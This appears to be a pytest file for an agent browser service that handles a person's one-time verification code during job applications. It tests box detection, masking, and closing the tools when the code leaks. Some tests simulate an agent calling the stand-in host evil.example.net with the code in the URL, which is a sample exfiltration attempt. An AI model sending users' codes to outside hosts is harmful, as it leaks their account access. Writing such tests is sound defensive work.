"""browserd's side of the code the person gives in the app (apply A25, owner 2026-11-26: "les
deux sont possibles"): the one exception of the credential rule. `detect.code_box` (accept and
refuse tables), the routes that keep it on the lease for one ask (`give_code`, `erase_code`, the
ask's binding of `agent_ask`), and `browser_type_code`: once, the lease's page of the ask's host,
a box of the top document the detector holds for a one time code box, the code never in an
answer: masked in every answer of the lease until it ends, back, forward and a GET form's
address included, a screenshot, a script and a search of the page's text refused meanwhile,
and the tools closed when it shows on another host or in the agent's own call."""

from __future__ import annotations

import json
import sys
from pathlib import Path
from types import SimpleNamespace
from typing import Any
from urllib.parse import parse_qs, urlencode, urlsplit

import pytest

ROOT = Path(__file__).resolve().parents[3]
pytestmark = pytest.mark.skipif(
    not (ROOT / "browser/browserd").is_dir(), reason="the repository root is not mounted here"
)
sys.path.insert(0, str(ROOT / "browser"))

from browserd import app, detect  # noqa: E402
from browserd.leases import LeaseError  # noqa: E402
from browserd.tools import actions, codes, pacing, routes  # noqa: E402

from tests.browser.test_browserd_unit import Clock, manager, request, run  # noqa: E402

CODE = "Q4815162342"
HOST = "jobs.example.org"
ASK = "0123456789abcdef"


def box(*names: str, **rest: Any) -> dict[str, Any]:
    """The facts CODE_BOX_JS reads of a plain text box of the top document."""
    facts = {"tag": "input", "type": "text", "autocomplete": [], "names": list(names), "max": -1,
             "readonly": False, "disabled": False, "top": True, "host": HOST,
             "credential": False}  # fmt: skip
    return {**facts, **rest}


OTP = ["one-time-code"]


@pytest.mark.parametrize(
    ("facts", "verdict"),
    [
        # Boxes a site gives for the code it just sent: allowed.
        (box(autocomplete=OTP, credential=True), None),
        (box("otp"), None),
        (box("otpCode"), None),
        (box("OTP"), None),
        (box("totp"), None),
        (box("mfa_code"), None),
        (box("2fa"), None),
        (box("code"), None),
        (box("Code"), None),
        (box("verificationCode"), None),
        (box("verification_code"), None),
        (box("Verification code"), None),
        (box("Enter the verification code we sent you"), None),
        (box("security-code"), None),
        (box("Security code"), None),
        (box("confirmationCode"), None),
        (box("Sign-in code"), None),
        (box("emailCode"), None),
        (box("SMS code"), None),
        (box("Code de vérification"), None),
        (box("Code de sécurité"), None),
        (box("Code reçu par e-mail"), None),
        (box("Bestätigungscode"), None),
        (box("Sicherheitscode"), None),
        (box("otp", type="tel"), None),
        (box("otp", type="number"), None),
        (box("otp", max=6), None),
        (box("otp", autocomplete=["off"]), None),
        (box("otp", autocomplete=["section-login", "one-time-code"], credential=True), None),
        # A password, a passkey or a sign in's user name: the person's own.
        (box("otp", type="password"), "credential"),
        (box("code", autocomplete=["current-password"], credential=True), "credential"),
        (box("code", autocomplete=["new-password"], credential=True), "credential"),
        (box("code", autocomplete=["username"], credential=True), "credential"),
        (box("code", autocomplete=["webauthn"], credential=True), "credential"),
        (box("login", credential=True), "credential"),  # a user name box of a sign in form
        # Codes that are no one time code: refused.
        (box("postalCode"), "not_code_box"),
        (box("Code postal"), "not_code_box"),
        (box("zipCode"), "not_code_box"),
        (box("Postcode"), "not_code_box"),
        (box("countryCode"), "not_code_box"),
        (box("Area code"), "not_code_box"),
        (box("promoCode"), "not_code_box"),
        (box("Coupon code"), "not_code_box"),
        (box("Discount code"), "not_code_box"),
        (box("Referral code"), "not_code_box"),
        (box("Code de parrainage"), "not_code_box"),
        (box("Invitation code"), "not_code_box"),
        (box("Gift card code"), "not_code_box"),
        (box("Sort code"), "not_code_box"),
        (box("Bank code"), "not_code_box"),
        (box("Card security code"), "not_code_box"),
        (box("CVC"), "not_code_box"),
        (box("PIN code"), "not_code_box"),
        (box("Recovery code"), "not_code_box"),
        (box("Backup code"), "not_code_box"),
        (box("Access code"), "not_code_box"),
        (box("Passcode"), "not_code_box"),
        (box("Code NAF"), "not_code_box"),
        (box("verification postal code"), "not_code_box"),
        (box("otp", "promo"), "not_code_box"),
        (box("Tracking code"), "not_code_box"),
        # Boxes that hold no code at all, or say nothing: refused.
        (box(), "not_code_box"),
        (box("search"), "not_code_box"),
        (box("Message to the recruiter"), "not_code_box"),
        (box("Your code of conduct"), "not_code_box"),
        (box("Zip"), "not_code_box"),
        (box("email"), "not_code_box"),
        (box("otp", autocomplete=["email"]), "not_code_box"),
        (box("otp", autocomplete=["tel"]), "not_code_box"),
        (box("otp", autocomplete=["postal-code"]), "not_code_box"),
        (box("otp", autocomplete=["cc-number"]), "not_code_box"),
        (box("otp", type="email"), "not_code_box"),
        (box("otp", type="search"), "not_code_box"),
        (box("otp", type="hidden"), "not_code_box"),
        (box("otp", type="url"), "not_code_box"),
        (box("otp", tag="textarea", type=""), "not_code_box"),
        (box("otp", tag="div", type=""), "not_code_box"),
        (box("otp", readonly=True), "not_code_box"),
        (box("otp", disabled=True), "not_code_box"),
        (box("otp", top=False), "not_code_box"),  # a frame's box
        (box("otp", credential=None), "not_code_box"),
        (box("otp", names=None), "not_code_box"),
        (box("otp", autocomplete=None), "not_code_box"),
        (None, "not_code_box"),
        ("otp", "not_code_box"),
    ],
)
def test_the_code_box_detector(facts: Any, verdict: str | None) -> None:
    assert detect.code_box(facts) == verdict


def ask_route(svc: Any, lease_id: str, token: str, action: str, body: Any) -> Any:
    path = f"/leases/{lease_id}/ask/{action}"
    return call(svc, path, body, {"x-lease-token": token})


def call(svc: Any, path: str, body: Any, headers: dict[str, str] | None = None) -> Any:
    route = next(r for r in app.ROUTES if r.pattern.fullmatch(path) and r.method == "POST")
    req = app.HttpRequest("POST", path, headers or {}, json.dumps(body).encode())
    return route.handler(svc, req, route.pattern.fullmatch(path))


def give(svc: Any, lease_id: str, *, user: str = "a", ask: str = ASK, code: str = CODE) -> Any:
    return call(svc, f"/leases/{lease_id}/code", {"user_id": user, "ask": ask, "code": code})


def world() -> tuple[Clock, Any, Any]:
    clock = Clock()
    mgr, _ = manager(clock, idle_s=300)
    return clock, mgr, app.Service(mgr, b"fake-control")


def page_on(state: actions.State, url: str) -> None:
    state.page = SimpleNamespace(url=url, is_closed=lambda: False)


def test_a_code_is_kept_for_its_ask_only_and_dropped_at_the_next_ask_and_the_end() -> None:
    _, mgr, svc = world()

    async def go() -> None:
        lease, token = await mgr.acquire(request("apply_agent"))
        state = routes.state_of(lease)
        page_on(state, f"https://{HOST}/verify")
        begin = {"left_s": 900, "ask": ASK, "code": True}
        assert (await ask_route(svc, lease.lease_id, token, "begin", begin))[0] == 200
        assert (state.ask_id, state.ask_host, state.ask_code) == (ASK, HOST, True)
        assert await give(svc, lease.lease_id) == (200, {"ok": True})
        assert (state.code, state.code_host) == (CODE, HOST)
        assert CODE not in repr(state)
        assert state.shown.found(CODE) == {HOST}  # masked from now on, until the lease ends
        with pytest.raises(LeaseError) as twice:  # one code per ask
            await give(svc, lease.lease_id, code="Z9Z9Z9")
        assert (twice.value.status, state.code) == (409, CODE)
        # The next ask drops it, whatever its kind.
        await ask_route(svc, lease.lease_id, token, "resume", {})
        assert state.code == CODE  # the resume after the code: kept for the agent to type
        await ask_route(svc, lease.lease_id, token, "begin", {"left_s": 60, "ask": "f" * 16})
        assert state.code is None
        # A code was given, then the person's erase or the lease's end drops it.
        state.code = CODE
        assert await call(svc, f"/leases/{lease.lease_id}/code/erase", {"user_id": "a"}) == (
            200,
            {"ok": True},
        )
        assert state.code is None
        assert state.shown.found(CODE) == {HOST}  # erased, still masked
        state.code = CODE
        state.end()
        assert (state.code, state.code_box, state.ask_id) == (None, None, "")
        assert not state.shown

    run(go())


@pytest.mark.parametrize(
    ("case", "status", "error"),
    [
        ("no_code_ask", 409, "not_waiting"),  # the ask takes no code
        ("other_ask", 409, "not_waiting"),  # a code of another ask (another application)
        ("resumed", 409, "not_waiting"),  # the wait ended
        ("never_asked", 409, "not_waiting"),
        ("other_person", 404, "not_found"),
        ("other_lease", 404, "not_found"),
        ("sweep", 403, "wrong_purpose"),
        ("apply_fill", 403, "wrong_purpose"),
        ("apply_submit", 403, "wrong_purpose"),
        ("short", 400, "bad_args"),
        ("long", 400, "bad_args"),
        ("spaced", 400, "bad_args"),
        ("not_ascii", 400, "bad_args"),
        ("extra_key", 400, "bad_args"),
    ],
)
def test_a_code_is_refused_off_its_ask(case: str, status: int, error: str) -> None:
    _, mgr, svc = world()

    async def go() -> None:
        purpose = case if case in ("sweep", "apply_fill", "apply_submit") else "apply_agent"
        lease, token = await mgr.acquire(request(purpose))
        state = routes.state_of(lease)
        page_on(state, f"https://{HOST}/verify")
        if purpose == "apply_agent" and case != "never_asked":
            begin = {"left_s": 900, "ask": ASK, "code": case != "no_code_ask"}
            await ask_route(svc, lease.lease_id, token, "begin", begin)
        if case == "resumed":
            await ask_route(svc, lease.lease_id, token, "resume", {})
        lease_id = "00000000-0000-4000-8000-000000000000" if case == "other_lease" else (
            lease.lease_id
        )  # fmt: skip
        body = {"user_id": "b" if case == "other_person" else "a",
                "ask": "e" * 16 if case == "other_ask" else ASK,
                "code": {"short": "123", "long": "1" * 17, "spaced": "123 456",
                         "not_ascii": "１２３４５６"}.get(case, CODE)}  # fmt: skip
        if case == "extra_key":
            body["reason"] = "x"
        with pytest.raises(LeaseError) as refused:
            await call(svc, f"/leases/{lease_id}/code", body)
        assert (refused.value.status, refused.value.code) == (status, error)
        assert state.code is None

    run(go())


@pytest.mark.parametrize(
    "body",
    [{"left_s": 60, "code": True}, {"left_s": 60, "ask": "ABC", "code": True},
     {"left_s": 60, "ask": ASK, "code": "yes"}, {"left_s": 60, "ask": 7}],
)  # fmt: skip
def test_a_begin_that_takes_a_code_names_its_ask(body: dict[str, Any]) -> None:
    _, mgr, svc = world()

    async def go() -> None:
        lease, token = await mgr.acquire(request("apply_agent"))
        with pytest.raises(LeaseError) as refused:
            await ask_route(svc, lease.lease_id, token, "begin", body)
        assert refused.value.status == 400

    run(go())


# --- the tool, on a fake tab as hard as Chromium ----------------------------------------------


class Box:
    """A box of one document of the fake tab, and its element handle: its facts, its value and
    the focus. Once its document is left (a navigation) the handle raises, as Playwright's does."""

    def __init__(self, doc: Doc, facts: dict[str, Any], value: str = "") -> None:
        self.doc, self.facts, self.value = doc, facts, value

    async def count(self) -> int:
        return 1

    async def evaluate(self, script: str, arg: Any = None, **_: Any) -> Any:
        if not self.doc.live:
            raise RuntimeError("Execution context was destroyed")
        if script == detect.CODE_BOX_JS:
            return self.facts
        if script == actions.FOCUSED_JS:
            return self.doc.focus is self
        if script == actions.VALUE_JS:
            return self.value
        if script == actions.SAME_JS:
            return arg is self
        raise AssertionError(script)

    async def focus(self, **_: Any) -> None:
        self.doc.focus = self

    async def fill(self, text: str, **_: Any) -> None:
        self.value = text

    async def element_handle(self) -> Box:
        return self


class Doc:
    def __init__(self, url: str, facts: dict[str, Any] | None, value: str = "") -> None:
        self.url, self.live, self.focus = url, True, None
        self.boxes = [Box(self, facts, value)] if facts is not None else []


class Keyboard:
    def __init__(self, page: Page) -> None:
        self.page = page

    async def type(self, char: str) -> None:
        box = self.page.doc.focus
        if box is not None:
            box.value += char
            if self.page.steal_after is not None and len(box.value) >= self.page.steal_after:
                self.page.doc.focus = None  # a box per character: the page moves the focus on


class Page:
    """Chromium's tab as far as the code goes: each navigation makes a new document (the old
    one's handles detach); back and forward make the entry's document again with the values its
    box had (Chromium restores a form's values); Verify sends the form by GET: a new document
    whose address carries the box's value, and whose text says it back."""

    def __init__(self, url: str, facts: dict[str, Any], steal_after: int | None = None) -> None:
        self.facts, self.steal_after, self.keyboard = facts, steal_after, Keyboard(self)
        self.entries, self.at = [["about:blank", ""], [url, ""]], 1
        self.doc = self._open(url, "")

    @property
    def url(self) -> str:
        return self.doc.url

    def _open(self, url: str, value: str) -> Doc:
        self.doc = Doc(url, self.facts if urlsplit(url).path == "/verify" else None, value)
        return self.doc

    def _leave(self) -> None:
        self.entries[self.at][1] = self.doc.boxes[0].value if self.doc.boxes else ""
        self.doc.live = False

    def go(self, url: str) -> None:
        self._leave()
        self.entries[self.at + 1 :] = [[url, ""]]
        self.at += 1
        self._open(url, "")

    def move(self, step: int) -> None:
        self._leave()
        self.at += step
        self._open(*self.entries[self.at])


def tool_tab(purpose: str, page: Page, monkeypatch: Any, gate: bool = False) -> actions.Tab:
    """The tab of a lease the person gave CODE on (routes.give_code), the fake page's tools."""

    async def nothing(_: float) -> None:
        return None

    tab = actions.Tab(
        request=SimpleNamespace(purpose=purpose, hosts=(), submit_selectors=()),
        state=actions.State(),
        browser=None,
        pacer=pacing.Pacer(sleep=nothing),
        gate=gate,
    )
    tab.state.page = page

    async def the_page(*_: Any, **__: Any) -> Page:
        return page

    async def element(args: dict[str, Any]) -> tuple[Any, Any]:
        actions.policy.ref_of(args)
        return page.doc.boxes[0], None

    async def nothing_more(_: Any) -> None:
        return None

    async def settle(result: dict[str, Any]) -> dict[str, Any]:
        return result

    async def here(_: Any) -> dict[str, Any]:
        return {"ok": True, "url": page.url, "title": f"Verify {urlsplit(page.url).query}"}

    async def snapshot(_: Any, __: Any) -> dict[str, Any]:
        lines = [f'- textbox "Verification code" [ref=e5]: {b.value}' for b in page.doc.boxes]
        said = parse_qs(urlsplit(page.url).query).get("otp")
        lines += [f"- text: You entered {said[0]}"] if said else []
        lines += ['- button "Verify" [ref=e9]']
        return {**await here(None), "snapshot": "\n".join(lines)}

    async def click(_: Any, args: dict[str, Any]) -> dict[str, Any]:
        value = page.doc.boxes[0].value if page.doc.boxes else ""
        page.go(f"https://{HOST}/welcome?{urlencode({'otp': value})}")  # the form's GET
        return await here(None)

    async def history(step: int) -> dict[str, Any]:
        page.move(step)
        return await here(None)

    async def navigate(_: Any, args: dict[str, Any]) -> dict[str, Any]:
        page.go(args["url"])
        return await here(None)

    async def key(_: Any, args: dict[str, Any]) -> dict[str, Any]:
        box = page.doc.focus
        if box is not None and args["key"] == "Backspace":
            box.value = box.value[:-1]
        return await here(None)

    async def focused(_: Any) -> tuple[Any, str]:
        return page.doc.focus or SimpleNamespace(evaluate=body), "INPUT"

    async def body(*_: Any, **__: Any) -> str:
        return ""

    async def shown(_: Any, __: Any) -> dict[str, Any]:
        return {"ok": True, "url": page.url, "data": "aW1hZ2U=", "result": "1"}

    monkeypatch.setattr(tab, "page", the_page)
    monkeypatch.setattr(tab, "element", element)
    monkeypatch.setattr(tab, "approach", nothing_more)
    monkeypatch.setattr(tab, "settle", settle)
    monkeypatch.setattr(actions, "_here", here)
    monkeypatch.setattr(actions, "focus_of", focused)
    for name, tool in {
        "browser_snapshot": snapshot,
        "browser_click": click,
        "browser_navigate": navigate,
        "browser_navigate_back": lambda *_: history(-1),
        "browser_navigate_forward": lambda *_: history(1),
        "browser_press_key": key,
        "browser_take_screenshot": shown,
        "browser_evaluate": shown,
        "browser_wait_for": lambda *_: here(None),
    }.items():
        monkeypatch.setitem(actions.TOOLS, name, tool)
    tab.state.code, tab.state.code_host = CODE, HOST
    assert tab.state.shown.add(CODE, HOST)
    return tab


GOOD = box("otp", autocomplete=OTP, credential=True)
VERIFY = f"https://{HOST}/verify"


@pytest.mark.parametrize(
    ("case", "error"),
    [
        ("sweep", "not_code_box"),
        ("apply_fill", "not_code_box"),
        ("apply_submit", "not_code_box"),
        ("gate", "not_code_box"),
        ("no_code", "no_code"),
        ("frame_ref", "not_code_box"),
        ("other_page_host", "other_site"),
        ("box_of_another_document", "other_site"),
        ("password_box", "credential"),
        ("username_box", "credential"),
        ("message_box", "not_code_box"),
        ("promo_box", "not_code_box"),
        ("a_box_per_character", "code_too_long"),
        ("focus_moved", "focus_moved"),
    ],
)
def test_the_tool_refuses_and_the_code_is_gone_and_never_typed(
    case: str, error: str, monkeypatch: Any
) -> None:
    facts = {"password_box": box("otp", type="password"),
             "username_box": box("email", autocomplete=["username"], credential=True),
             "message_box": box("Message to the recruiter"), "promo_box": box("promoCode"),
             "a_box_per_character": {**GOOD, "max": 1},
             "box_of_another_document": {**GOOD, "host": "evil.example.net"},
             }.get(case, GOOD)  # fmt: skip
    url = "https://evil.example.net/verify" if case == "other_page_host" else VERIFY
    page = Page(url, facts, steal_after=1 if case == "focus_moved" else None)
    purpose = case if case in ("sweep", "apply_fill", "apply_submit") else "apply_agent"
    tab = tool_tab(purpose, page, monkeypatch, gate=case == "gate")
    if case == "no_code":
        tab.state.code = None
    ref = "f1e5" if case == "frame_ref" else "e5"
    answer = run(actions.run(tab, "browser_type_code", {"ref": ref}))
    assert (answer["ok"], answer["error"]) == (False, error)
    assert tab.state.code is None  # used up: a second call answers no_code
    assert page.doc.boxes[0].value == ""
    assert CODE not in json.dumps(answer)
    again = run(actions.run(tab, "browser_type_code", {"ref": "e5"}))
    assert again["error"] == ("no_code" if purpose == "apply_agent" and not tab.gate else error)


def read(tab: actions.Tab, name: str = "browser_snapshot", **args: Any) -> dict[str, Any]:
    """A call of the agent, and that its answer never holds the code, in any of its forms."""
    answer = run(actions.run(tab, name, args))
    text = json.dumps(answer, ensure_ascii=False)
    assert not any(form in text for form in (CODE, CODE.lower(), "Q48 15", "Q4815%20162342"))
    return answer


@pytest.mark.parametrize("purpose", ["apply_agent", "apply_review"])
def test_the_code_stays_masked_after_back_forward_and_a_get_submit_until_the_lease_ends(
    purpose: str, monkeypatch: Any
) -> None:
    page = Page(VERIFY, GOOD)
    tab = tool_tab(purpose, page, monkeypatch)
    typed = read(tab, "browser_type_code", ref="e5")
    assert typed == {"ok": True, "url": VERIFY, "title": "Verify ", "code_typed": True}
    assert page.doc.boxes[0].value == CODE
    assert read(tab, "browser_type_code", ref="e5")["error"] == "no_code"
    assert codes.MASK in read(tab)["snapshot"]
    # Back, then forward: Chromium puts the code back in a new box, the old handle detached.
    read(tab, "browser_navigate_back")
    forward = read(tab, "browser_navigate_forward")
    assert page.doc.boxes[0].value == CODE
    assert codes.MASK in read(tab)["snapshot"], forward
    # The person's code box keeps its value: no key of the agent edits it.
    page.doc.focus = page.doc.boxes[0]
    for key in ("Backspace", "Delete", "Space"):
        assert read(tab, "browser_press_key", key=key)["error"] == "code_box_kept"
    assert page.doc.boxes[0].value == CODE
    # The form sent by GET: the code in the next document's address and text, masked.
    sent = read(tab, "browser_click", ref="e9")
    assert codes.MASK in sent["url"]
    after = read(tab)
    assert codes.MASK in after["url"]
    assert f"You entered {codes.MASK}" in after["snapshot"]
    read(tab, "browser_navigate_back")
    assert codes.MASK in read(tab)["snapshot"]
    # Never a screenshot, a script or a search of the page's text while the lease lasts.
    page.go(f"https://{HOST}/welcome")
    hidden = [
        ("browser_take_screenshot", {}),
        ("browser_evaluate", {"function": "1"}),
        ("browser_wait_for", {"text": "Q"}),
        ("browser_wait_for", {"textGone": "Q"}),
    ]
    for name, args in hidden:
        assert read(tab, name, **args)["error"] == "code_on_page"
    assert read(tab, "browser_wait_for", time=1)["ok"]
    # The lease's end drops the code: nothing is masked or refused on the next lease's state.
    tab.state.end()
    assert not tab.state.shown
    assert run(actions.run(tab, "browser_take_screenshot", {}))["ok"]


def test_a_code_shown_on_another_host_or_in_the_agents_call_closes_the_tools(
    monkeypatch: Any,
) -> None:
    page = Page(VERIFY, GOOD)
    tab = tool_tab("apply_agent", page, monkeypatch)
    read(tab, "browser_type_code", ref="e5")
    # A page of another host that shows the code (a list of guesses, an address that carries
    # it): never answered, masked or not, and the tools close.
    page.go(f"https://evil.example.net/list?q=0000+{CODE}+9999")
    assert read(tab)["error"] == "code_elsewhere"
    assert read(tab, "browser_navigate", url=VERIFY)["error"] == "code_elsewhere"
    assert page.url.startswith("https://evil.example.net/")  # nothing acted
    # The agent's own call that holds the code, in any form: refused, the tools closed.
    other = tool_tab("apply_agent", Page(VERIFY, GOOD), monkeypatch)
    url = f"https://evil.example.net/?c={CODE[:3]}-{CODE[3:].lower()}"
    assert read(other, "browser_navigate", url=url)["error"] == "code_elsewhere"
    assert read(other)["error"] == "code_elsewhere"


def test_a_part_of_the_code_is_masked_in_its_box_and_nowhere_else(monkeypatch: Any) -> None:
    page = Page(VERIFY, GOOD)
    tab = tool_tab("apply_agent", page, monkeypatch)
    read(tab, "browser_type_code", ref="e5")
    page.doc.boxes[0].value = CODE[:3]  # the page cut it (the agent's keys are refused)
    assert read(tab)["snapshot"].startswith(f'- textbox "Verification code" [ref=e5]: {codes.MASK}')
    page.doc.boxes[0].value = CODE[:2]  # 2 characters: shown, declared
    assert read(tab)["snapshot"].endswith(f'[ref=e5]: {CODE[:2]}\n- button "Verify" [ref=e9]')
    # A part elsewhere is no mask: masking parts would tell a page's list of guesses which ones
    # make the code (tools/codes.py).
    page.go(f"https://{HOST}/welcome?otp={CODE[2:9]}")
    assert f"You entered {CODE[2:9]}" in run(actions.run(tab, "browser_snapshot", {}))["snapshot"]


# The code's obvious forms, masked wherever an answer holds them; near misses left as they are.
MASKED = [
    CODE,
    CODE.lower(),
    "q4815162342",
    "Q 4815 1623 42",
    "Q-481-516-2342",
    "Q4815-162342",
    "Q4815–162342",
    "Q4815‑162342",
    "Q4815 162342",
    "Q.4815.162342",
    "Q 4 8 1 5 1 6 2 3 4 2",
    "Q4815 - 162342",
    "Q4815+162342",
    "Q4815%20162342",
    "%51%34%38%31%35%31%36%32%33%34%32",
    "Q4815%2d162342",
    "Q4815%E2%80%93162342",
    "Ｑ４８１５１６２３４２",
    "xQ4815162342x",
    "otp=Q4815162342&next=1",
    "Q4815162342Q4815162342",
]
UNMASKED = [
    "Q481516234",
    "4815162342",
    "Q4815l62342",
    "Q4815 . - . 162342",
    "Q4815/162342",
    "Q4815:162342",
    "Q4815,162342",
    "Q4815_162342",
    "Q48151623",
    "Q4815162343",
    "Q 481516234 3X",
    "Q4815    162342",
    "Q4815\n\n\n\n162342",
    "Q48%2F15162342",
    "O4815162342",
    "Q4B15162342",
    "Q4815162342"[::-1],
    "Q4815 16 23 4",
    "2342 Q4815 16",
    "the code",
    "",
]


@pytest.mark.parametrize("text", MASKED)
def test_the_mask_holds_the_obvious_forms_of_the_code(text: str) -> None:
    shown = codes.Codes()
    shown.add(CODE, HOST)
    assert shown.found({"snapshot": [text]}) == {HOST}
    assert codes.MASK in shown.hide(text)
    assert not shown.found(shown.hide(text))


@pytest.mark.parametrize("text", UNMASKED)
def test_the_mask_leaves_near_misses_as_they_are(text: str) -> None:
    shown = codes.Codes()
    shown.add(CODE, HOST)
    assert shown.found(text) == set()
    assert shown.hide(text) == text


def test_the_mask_keeps_the_snapshots_refs_and_names_no_code() -> None:
    shown = codes.Codes()
    shown.add("4815", HOST)
    assert (
        shown.hide('- button "Pay 4815" [ref=e4815]') == f'- button "Pay {codes.MASK}" [ref=e4815]'
    )
    assert "4815" not in repr(shown)
    assert "4815" not in repr(actions.State(shown=shown))
    assert all(shown.add(f"{n:04d}", HOST) for n in range(codes.CODES_MAX - 1))
    assert not shown.add("99999", HOST)  # past CODES_MAX: give_code answers 409


def test_the_capability_never_goes_with_the_code_tool() -> None:
    _, mgr, svc = world()

    async def go() -> None:
        lease, token = await mgr.acquire(request("apply_agent"))
        capability = routes.issue_capability(lease)
        assert capability is not None
        path = f"/leases/{lease.lease_id}/tools/browser_type_code"
        headers = {"x-lease-token": token, "x-gate-capability": capability}
        with pytest.raises(LeaseError) as refused:
            await call(svc, path, {"ref": "e5"}, headers)
        assert refused.value.status == 403

    run(go())
